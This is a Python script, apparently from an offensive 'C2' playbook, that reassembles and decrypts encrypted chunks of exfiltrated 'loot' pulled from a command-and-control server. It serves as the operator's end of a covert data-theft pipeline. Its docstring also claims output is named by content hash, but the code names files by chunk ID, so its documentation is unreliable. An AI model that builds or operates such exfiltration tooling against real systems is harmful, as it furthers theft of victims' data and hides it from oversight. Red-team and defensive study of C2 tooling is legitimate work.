#!/usr/bin/env python3
"""Reassemble + decrypt C2 chunks (GHOST-HUNT playbook 12.1.4).

Operator-side tool. Pull chunks off the server (scp), then:
    C2_KEY=<fernet-key> python3 pull.py --dir ./loot --out ./recovered
    python3 pull.py --dir ./loot --key <fernet-key> --out ./recovered
    python3 pull.py --dir ./loot --key <fernet-key> --out ./recovered --strict

Output: ./recovered/<content-hash>.bin per reassembled file.

Loss handling: Fernet is authenticated encryption, so ANY missing, truncated,
reordered, or duplicated chunk makes decryption fail loudly (InvalidToken) —
there is NO silent-corruption path. The puller adds a seq-gap scan so the
operator sees exactly which chunk sequences are missing (a lost tail chunk is
invisible to that scan but still fails decryption — Fernet is the backstop).

Exit codes: 0 = clean (or non-strict with data warnings); 1 = operational
error (no capture, malformed input); 2 = --strict and a chunk-gap warning or
a decrypt failure occurred (for automated pipelines).
"""

import argparse
import glob
import os
import sys
from typing import Dict


def main() -> int:
    ap = argparse.ArgumentParser(description="Reassemble & decrypt C2 chunks")
    ap.add_argument("--dir", required=True, help="directory containing *.bin chunks")
    ap.add_argument("--key", default=os.environ.get("C2_KEY"), help="Fernet key (default: $C2_KEY)")
    ap.add_argument("--out", default="recovered", help="output directory (default: recovered)")
    ap.add_argument(
        "--strict",
        action="store_true",
        help="exit 2 if any chunk-gap warning or decrypt failure occurred "
        "(for automated pipelines; default still exits 0 so other files "
        "in the capture are pulled for triage)",
    )
    args = ap.parse_args()

    if not args.key:
        ap.error("set --key or the C2_KEY environment variable")
    if not os.path.isdir(args.dir):
        ap.error(f"chunk directory not found: {args.dir}")

    from cryptography.fernet import Fernet  # late import

    key = Fernet(args.key.encode())
    os.makedirs(args.out, exist_ok=True)

    # Group chunks by ID (filename: <id>_<seq>.bin), preserving seq order
    by_id: Dict[str, Dict[int, str]] = {}
    for f in sorted(glob.glob(os.path.join(args.dir, "*.bin"))):
        base: str = os.path.basename(f)
        cid: str
        _: str
        suffix: str
        cid, _, suffix = base.rpartition("_")
        try:
            seq: int = int(suffix.split(".")[0])
        except ValueError:
            print(f"[!] Skipping malformed chunk name: {base}")
            continue
        by_id.setdefault(cid.lower(), {})[seq] = f  # lowercase: grouping is case-insensitive

    if not by_id:
        print(f"[!] No *.bin chunks found in {args.dir}")
        return 1

    total: int = 0
    reassembled: int = 0
    data_warning: bool = False  # raised by --strict for automated pipelines
    for cid in sorted(by_id):
        chunks: Dict[int, str] = by_id[cid]
        seqs = sorted(chunks)
        # The scan is O(max_seq) — guard against a stray chunk with an
        # implausibly large seq (handler caps at 9 digits) allocating a giant
        # list; Fernet auth still validates the data either way.
        if seqs[-1] < 1_000_000:
            missing = [s for s in range(0, seqs[-1] + 1) if s not in chunks]
        else:
            missing = []
            print(f"[!] {cid}: max chunk seq {seqs[-1]} implausible for "
                  f"{len(seqs)} chunk(s) — gap scan skipped "
                  "(Fernet auth still validates the recovered data)")
        # range starts at 0 — a lost first chunk (seq 0) would otherwise be
        # silently missing from the gap scan's lower bound
        if missing:
            data_warning = True
            print(f"[!] {cid}: WARNING missing chunks {missing} — "
                  f"the file will fail to decrypt (Fernet auth)")
        data: bytes = b""
        for seq in seqs:
            with open(chunks[seq], "rb") as fh:
                data += fh.read()
        try:
            plain: bytes = key.decrypt(data)
        except Exception as exc:
            data_warning = True
            cause = (f"missing seqs {missing}" if missing
                     else "no seq gaps detected — wrong key, or tail chunks lost "
                     "beyond the last received seq")
            print(f"[!] {cid}: decrypt failed ({exc}); {cause} — file NOT recovered")
            continue
        out: str = os.path.join(args.out, f"{cid}.bin")
        with open(out, "wb") as fh:
            fh.write(plain)
        reassembled += 1
        print(f"[+] {cid}: {len(plain)} bytes -> {out}")
        total += len(plain)

    print(f"[+] Reassembled {reassembled} of {len(by_id)} file(s), {total} bytes total")
    # Exit 0 by default so other files in the capture stay pullable; --strict
    # gives automation a non-zero signal that some data is corrupt.
    if args.strict and data_warning:
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
